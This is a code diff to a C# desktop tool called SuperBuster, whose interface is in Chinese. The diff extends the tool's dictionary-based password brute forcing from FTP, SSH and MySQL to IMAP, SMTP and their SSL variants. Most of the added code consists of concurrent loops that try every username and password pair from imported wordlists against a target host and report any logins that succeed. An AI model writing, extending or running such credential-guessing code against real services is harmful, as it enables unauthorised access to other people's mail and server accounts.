@@ -13,6 +13,8 @@ using System.Threading;
 using Renci.SshNet;
 using MySql.Data.MySqlClient;
 using System.Diagnostics;
+using Limilabs.Client.IMAP;
+using Limilabs.Client.SMTP;
 
 namespace SuperBuster
 {
@@ -73,15 +75,25 @@ namespace SuperBuster
 
         private void button3_Click(object sender, EventArgs e)
         {
+            int Number;
+            bool IsNumber = int.TryParse(textBox2.Text, out Number);
             if (textBox1.Text == "")
             {
                 MessageBox.Show("请输入目标主机！", "提示");
             }
-            else if (users[0] == "")
+            else if(textBox2.Text == "")
+            {
+                MessageBox.Show("请输入Task最大并发数量！", "提示");
+            }
+            else if(IsNumber == false)
+            {
+                MessageBox.Show("请输入正确的Task最大并发数量！", "提示");
+            }
+            else if (users == null)
             {
                 MessageBox.Show("请导入用户名字典！", "提示");
             }
-            else if (passwords[0] == "")
+            else if (passwords == null)
             {
                 MessageBox.Show("请导入密码字典！", "提示");
             }
@@ -94,9 +106,7 @@ namespace SuperBuster
                 textBox2.Enabled = true;
                 button1.Enabled = true;
                 button2.Enabled = true;
-                radioButton1.Enabled = true;
-                radioButton2.Enabled = true;
-                radioButton3.Enabled = true;
+                comboBox1.Enabled = true;
                 checkBox1.Enabled = true;
                 richTextBox3.Text += "爆破结束！";                
                 MessageBox.Show("爆破结束！", "提示");
@@ -104,15 +114,13 @@ namespace SuperBuster
             else
             {
                 host = textBox1.Text;
-                if (radioButton1.Checked)
+                if (comboBox1.SelectedItem.ToString() == "FTP")
                 {
                     textBox1.Enabled = false;
                     textBox2.Enabled = false;
                     button1.Enabled = false;
                     button2.Enabled = false;
-                    radioButton1.Enabled = false;
-                    radioButton2.Enabled = false;
-                    radioButton3.Enabled = false;
+                    comboBox1.Enabled = false;
                     checkBox1.Enabled = false;
                     richTextBox3.Clear();
                     label3.Text = "正在进行FTP爆破......";
@@ -121,15 +129,13 @@ namespace SuperBuster
                     Thread thread2 = new Thread(new ThreadStart(FTPBomb));
                     thread2.Start();
                 }
-                else if (radioButton2.Checked)
+                else if (comboBox1.SelectedItem.ToString() == "SSH")
                 {
                     textBox1.Enabled = false;
                     textBox2.Enabled = false;
                     button1.Enabled = false;
                     button2.Enabled = false;
-                    radioButton1.Enabled = false;
-                    radioButton2.Enabled = false;
-                    radioButton3.Enabled = false;
+                    comboBox1.Enabled = false;
                     checkBox1.Enabled = false;
                     richTextBox3.Clear();
                     label3.Text = "正在进行SSH爆破......";
@@ -138,21 +144,79 @@ namespace SuperBuster
                     Thread thread3 = new Thread(new ThreadStart(SSHBomb));
                     thread3.Start();
                 }
-                else if (radioButton3.Checked)
+                else if (comboBox1.SelectedItem.ToString() == "MySQL")
                 {
                     textBox1.Enabled = false;
                     textBox2.Enabled = false;
                     button1.Enabled = false;
                     button2.Enabled = false;
-                    radioButton1.Enabled = false;
-                    radioButton2.Enabled = false;
-                    radioButton3.Enabled = false;
+                    comboBox1.Enabled = false;
                     checkBox1.Enabled = false;
                     richTextBox3.Clear();
                     label3.Text = "正在进行MySQL爆破......";
                     MessageBox.Show("开始MySQL爆破！", "提示");
                     button3.Text = "停止爆破";
                     Thread thread4 = new Thread(new ThreadStart(MySQLBomb));
+                    thread4.Start();
+                }
+                else if (comboBox1.SelectedItem.ToString() == "IMAP")
+                {
+                    textBox1.Enabled = false;
+                    textBox2.Enabled = false;
+                    button1.Enabled = false;
+                    button2.Enabled = false;
+                    comboBox1.Enabled = false;
+                    checkBox1.Enabled = false;
+                    richTextBox3.Clear();
+                    label3.Text = "正在进行IMAP爆破......";
+                    MessageBox.Show("开始IMAP爆破！", "提示");
+                    button3.Text = "停止爆破";
+                    Thread thread4 = new Thread(new ThreadStart(IMAPBomb));
+                    thread4.Start();
+                }
+                else if (comboBox1.SelectedItem.ToString() == "IMAP_SSL")
+                {
+                    textBox1.Enabled = false;
+                    textBox2.Enabled = false;
+                    button1.Enabled = false;
+                    button2.Enabled = false;
+                    comboBox1.Enabled = false;
+                    checkBox1.Enabled = false;
+                    richTextBox3.Clear();
+                    label3.Text = "正在进行IMAP_SSL爆破......";
+                    MessageBox.Show("开始IMAP_SSL爆破！", "提示");
+                    button3.Text = "停止爆破";
+                    Thread thread4 = new Thread(new ThreadStart(IMAP_SSLBomb));
+                    thread4.Start();
+                }
+                else if (comboBox1.SelectedItem.ToString() == "SMTP")
+                {
+                    textBox1.Enabled = false;
+                    textBox2.Enabled = false;
+                    button1.Enabled = false;
+                    button2.Enabled = false;
+                    comboBox1.Enabled = false;
+                    checkBox1.Enabled = false;
+                    richTextBox3.Clear();
+                    label3.Text = "正在进行SMTP爆破......";
+                    MessageBox.Show("开始SMTP爆破！", "提示");
+                    button3.Text = "停止爆破";
+                    Thread thread4 = new Thread(new ThreadStart(SMTPBomb));
+                    thread4.Start();
+                }
+                else if (comboBox1.SelectedItem.ToString() == "SMTP_SSL")
+                {
+                    textBox1.Enabled = false;
+                    textBox2.Enabled = false;
+                    button1.Enabled = false;
+                    button2.Enabled = false;
+                    comboBox1.Enabled = false;
+                    checkBox1.Enabled = false;
+                    richTextBox3.Clear();
+                    label3.Text = "正在进行SMTP_SSL爆破......";
+                    MessageBox.Show("开始SMTP_SSL爆破！", "提示");
+                    button3.Text = "停止爆破";
+                    Thread thread4 = new Thread(new ThreadStart(SMTP_SSLBomb));
                     thread4.Start();
                 }
                 else
@@ -199,9 +263,7 @@ namespace SuperBuster
                                             textBox2.Enabled = true;
                                             button1.Enabled = true;
                                             button2.Enabled = true;
-                                            radioButton1.Enabled = true;
-                                            radioButton2.Enabled = true;
-                                            radioButton3.Enabled = true;
+                                            comboBox1.Enabled = true;
                                             checkBox1.Enabled = true;
                                             MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                         }
@@ -240,9 +302,7 @@ namespace SuperBuster
                 textBox2.Enabled = true;
                 button1.Enabled = true;
                 button2.Enabled = true;
-                radioButton1.Enabled = true;
-                radioButton2.Enabled = true;
-                radioButton3.Enabled = true;
+                comboBox1.Enabled = true;
                 checkBox1.Enabled = true;
                 MessageBox.Show("爆破结束！", "提示");
             }
@@ -301,9 +361,7 @@ namespace SuperBuster
                                             textBox2.Enabled = true;
                                             button1.Enabled = true;
                                             button2.Enabled = true;
-                                            radioButton1.Enabled = true;
-                                            radioButton2.Enabled = true;
-                                            radioButton3.Enabled = true;
+                                            comboBox1.Enabled = true;
                                             checkBox1.Enabled = true;
                                             MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                         }
@@ -342,9 +400,7 @@ namespace SuperBuster
                 textBox2.Enabled = true;
                 button1.Enabled = true;
                 button2.Enabled = true;
-                radioButton1.Enabled = true;
-                radioButton2.Enabled = true;
-                radioButton3.Enabled = true;
+                comboBox1.Enabled = true;
                 checkBox1.Enabled = true;
                 MessageBox.Show("爆破结束！", "提示");
             }
@@ -404,9 +460,7 @@ namespace SuperBuster
                                             textBox2.Enabled = true;
                                             button1.Enabled = true;
                                             button2.Enabled = true;
-                                            radioButton1.Enabled = true;
-                                            radioButton2.Enabled = true;
-                                            radioButton3.Enabled = true;
+                                            comboBox1.Enabled = true;
                                             checkBox1.Enabled = true;
                                             MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                         }
@@ -446,9 +500,7 @@ namespace SuperBuster
                 textBox2.Enabled = true;
                 button1.Enabled = true;
                 button2.Enabled = true;
-                radioButton1.Enabled = true;
-                radioButton2.Enabled = true;
-                radioButton3.Enabled = true;
+                comboBox1.Enabled = true;
                 checkBox1.Enabled = true;
                 MessageBox.Show("爆破结束！", "提示");
             }
@@ -484,6 +536,430 @@ namespace SuperBuster
         private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
             MessageBox.Show("邮箱反馈：thrower@thrower.cc", "提示");
+        }
+
+        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            MessageBox.Show("作者：Thrower\nQQ：3432653417\n邮箱：thrower@thrower.cc\nQQ交流灌水群1：801170943\nQQ交流灌水群2：631216511\n欢迎萌新及大佬加群！", "作者信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            Process.Start("https://thrower.cc/");
+        }
+        private void IMAPBomb()
+        {
+            currentrequestId++;
+            int a = currentrequestId;
+            RequestIds.Add(currentrequestId, true);
+            List<Task> TaskList = new List<Task>();
+            for (int i = 0; i < users.Length; i++)
+            {
+                int l = i;
+                for (int y = 0; y < passwords.Length; y++)
+                {
+                    int Y = y;
+                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
+                    {
+                        Task.WaitAny(TaskList.ToArray());
+                    }
+                    TaskList.Add(Task.Factory.StartNew(() =>
+                    {
+                        if (RequestIds[a])
+                        {
+                            bool result = IMAPRequest(host, users[l], passwords[Y]);
+                            if (result)
+                            {
+                                BeginInvoke(new Action(() =>
+                                {
+                                    if (RequestIds[a])
+                                    {
+                                        if (checkBox1.Checked)
+                                        {
+                                            RequestIds[a] = false;
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                            button3.Text = "开始爆破";
+                                            label3.Text = "";
+                                            richTextBox3.Text += "爆破结束！";
+                                            textBox1.Enabled = true;
+                                            textBox2.Enabled = true;
+                                            button1.Enabled = true;
+                                            button2.Enabled = true;
+                                            comboBox1.Enabled = true;
+                                            checkBox1.Enabled = true;
+                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
+                                        }
+                                        else
+                                        {
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                        }
+                                    }
+                                }));
+                            }
+                            else
+                            {
+                                BeginInvoke(new Action(() =>
+                                {
+                                    if (RequestIds[a])
+                                    {
+                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
+                                    }
+                                }));
+                            }
+                        }
+                        else
+                        {
+                            return;
+                        }
+                    }));
+                }
+            }
+            Task.WaitAll(TaskList.ToArray());
+            Thread.Sleep(1000);
+            if (RequestIds[a])
+            {
+                button3.Text = "开始爆破";
+                label3.Text = "";
+                richTextBox3.Text += "爆破结束！";
+                textBox1.Enabled = true;
+                textBox2.Enabled = true;
+                button1.Enabled = true;
+                button2.Enabled = true;
+                comboBox1.Enabled = true;
+                checkBox1.Enabled = true;
+                MessageBox.Show("爆破结束！", "提示");
+            }
+        }
+        private bool IMAPRequest(string host,string user,string password)
+        {
+            Imap imap = new Imap();
+            try
+            {
+                imap.Connect(host);
+                imap.UseBestLogin(user, password);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+            finally
+            {
+                imap.Close();
+            }
+        }
+        private void IMAP_SSLBomb()
+        {
+            currentrequestId++;
+            int a = currentrequestId;
+            RequestIds.Add(currentrequestId, true);
+            List<Task> TaskList = new List<Task>();
+            for (int i = 0; i < users.Length; i++)
+            {
+                int l = i;
+                for (int y = 0; y < passwords.Length; y++)
+                {
+                    int Y = y;
+                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
+                    {
+                        Task.WaitAny(TaskList.ToArray());
+                    }
+                    TaskList.Add(Task.Factory.StartNew(() =>
+                    {
+                        if (RequestIds[a])
+                        {
+                            bool result = IMAP_SSLRequest(host, users[l], passwords[Y]);
+                            if (result)
+                            {
+                                BeginInvoke(new Action(() =>
+                                {
+                                    if (RequestIds[a])
+                                    {
+                                        if (checkBox1.Checked)
+                                        {
+                                            RequestIds[a] = false;
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                            button3.Text = "开始爆破";
+                                            label3.Text = "";
+                                            richTextBox3.Text += "爆破结束！";
+                                            textBox1.Enabled = true;
+                                            textBox2.Enabled = true;
+                                            button1.Enabled = true;
+                                            button2.Enabled = true;
+                                            comboBox1.Enabled = true;
+                                            checkBox1.Enabled = true;
+                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
+                                        }
+                                        else
+                                        {
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                        }
+                                    }
+                                }));
+                            }
+                            else
+                            {
+                                BeginInvoke(new Action(() =>
+                                {
+                                    if (RequestIds[a])
+                                    {
+                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
+                                    }
+                                }));
+                            }
+                        }
+                        else
+                        {
+                            return;
+                        }
+                    }));
+                }
+            }
+            Task.WaitAll(TaskList.ToArray());
+            Thread.Sleep(1000);
+            if (RequestIds[a])
+            {
+                button3.Text = "开始爆破";
+                label3.Text = "";
+                richTextBox3.Text += "爆破结束！";
+                textBox1.Enabled = true;
+                textBox2.Enabled = true;
+                button1.Enabled = true;
+                button2.Enabled = true;
+                comboBox1.Enabled = true;
+                checkBox1.Enabled = true;
+                MessageBox.Show("爆破结束！", "提示");
+            }
+        }
+        private bool IMAP_SSLRequest(string host, string user, string password)
+        {
+            Imap imap = new Imap();
+            try
+            {
+                imap.ConnectSSL(host);
+                imap.UseBestLogin(user, password);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+            finally
+            {
+                imap.Close();
+            }
+        }
+        private void SMTPBomb()
+        {
+            currentrequestId++;
+            int a = currentrequestId;
+            RequestIds.Add(currentrequestId, true);
+            List<Task> TaskList = new List<Task>();
+            for (int i = 0; i < users.Length; i++)
+            {
+                int l = i;
+                for (int y = 0; y < passwords.Length; y++)
+                {
+                    int Y = y;
+                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
+                    {
+                        Task.WaitAny(TaskList.ToArray());
+                    }
+                    TaskList.Add(Task.Factory.StartNew(() =>
+                    {
+                        if (RequestIds[a])
+                        {
+                            bool result = SMTPRequest(host, users[l], passwords[Y]);
+                            if (result)
+                            {
+                                BeginInvoke(new Action(() =>
+                                {
+                                    if (RequestIds[a])
+                                    {
+                                        if (checkBox1.Checked)
+                                        {
+                                            RequestIds[a] = false;
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                            button3.Text = "开始爆破";
+                                            label3.Text = "";
+                                            richTextBox3.Text += "爆破结束！";
+                                            textBox1.Enabled = true;
+                                            textBox2.Enabled = true;
+                                            button1.Enabled = true;
+                                            button2.Enabled = true;
+                                            comboBox1.Enabled = true;
+                                            checkBox1.Enabled = true;
+                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
+                                        }
+                                        else
+                                        {
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                        }
+                                    }
+                                }));
+                            }
+                            else
+                            {
+                                BeginInvoke(new Action(() =>
+                                {
+                                    if (RequestIds[a])
+                                    {
+                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
+                                    }
+                                }));
+                            }
+                        }
+                        else
+                        {
+                            return;
+                        }
+                    }));
+                }
+            }
+            Task.WaitAll(TaskList.ToArray());
+            Thread.Sleep(1000);
+            if (RequestIds[a])
+            {
+                button3.Text = "开始爆破";
+                label3.Text = "";
+                richTextBox3.Text += "爆破结束！";
+                textBox1.Enabled = true;
+                textBox2.Enabled = true;
+                button1.Enabled = true;
+                button2.Enabled = true;
+                comboBox1.Enabled = true;
+                checkBox1.Enabled = true;
+                MessageBox.Show("爆破结束！", "提示");
+            }
+        }
+        private bool SMTPRequest(string host, string user, string password)
+        {
+            Smtp smtp = new Smtp();
+            try
+            {
+                smtp.Connect(host);
+                smtp.UseBestLogin(user, password);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+            finally
+            {
+                smtp.Close();
+            }
+        }
+        private void SMTP_SSLBomb()
+        {
+            currentrequestId++;
+            int a = currentrequestId;
+            RequestIds.Add(currentrequestId, true);
+            List<Task> TaskList = new List<Task>();
+            for (int i = 0; i < users.Length; i++)
+            {
+                int l = i;
+                for (int y = 0; y < passwords.Length; y++)
+                {
+                    int Y = y;
+                    if (TaskList.Count >= Int32.Parse(textBox2.Text))
+                    {
+                        Task.WaitAny(TaskList.ToArray());
+                    }
+                    TaskList.Add(Task.Factory.StartNew(() =>
+                    {
+                        if (RequestIds[a])
+                        {
+                            bool result = SMTP_SSLRequest(host, users[l], passwords[Y]);
+                            if (result)
+                            {
+                                BeginInvoke(new Action(() =>
+                                {
+                                    if (RequestIds[a])
+                                    {
+                                        if (checkBox1.Checked)
+                                        {
+                                            RequestIds[a] = false;
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                            button3.Text = "开始爆破";
+                                            label3.Text = "";
+                                            richTextBox3.Text += "爆破结束！";
+                                            textBox1.Enabled = true;
+                                            textBox2.Enabled = true;
+                                            button1.Enabled = true;
+                                            button2.Enabled = true;
+                                            comboBox1.Enabled = true;
+                                            checkBox1.Enabled = true;
+                                            MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
+                                        }
+                                        else
+                                        {
+                                            richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
+                                        }
+                                    }
+                                }));
+                            }
+                            else
+                            {
+                                BeginInvoke(new Action(() =>
+                                {
+                                    if (RequestIds[a])
+                                    {
+                                        richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
+                                    }
+                                }));
+                            }
+                        }
+                        else
+                        {
+                            return;
+                        }
+                    }));
+                }
+            }
+            Task.WaitAll(TaskList.ToArray());
+            Thread.Sleep(1000);
+            if (RequestIds[a])
+            {
+                button3.Text = "开始爆破";
+                label3.Text = "";
+                richTextBox3.Text += "爆破结束！";
+                textBox1.Enabled = true;
+                textBox2.Enabled = true;
+                button1.Enabled = true;
+                button2.Enabled = true;
+                comboBox1.Enabled = true;
+                checkBox1.Enabled = true;
+                MessageBox.Show("爆破结束！", "提示");
+            }
+        }
+        private bool SMTP_SSLRequest(string host, string user, string password)
+        {
+            Smtp smtp = new Smtp();
+            try
+            {
+                smtp.ConnectSSL(host);
+                smtp.UseBestLogin(user, password);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+            finally
+            {
+                smtp.Close();
+            }
+        }
+
+        private void linkLabel4_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            try
+            {
+                string a = Directory.GetCurrentDirectory() + "/Update/Update.exe";
+                Process.Start(a);
+                Environment.Exit(0);
+            }
+            catch
+            {
+                MessageBox.Show("没有找到更新程序！", "提示");
+            }
         }
     }
 }
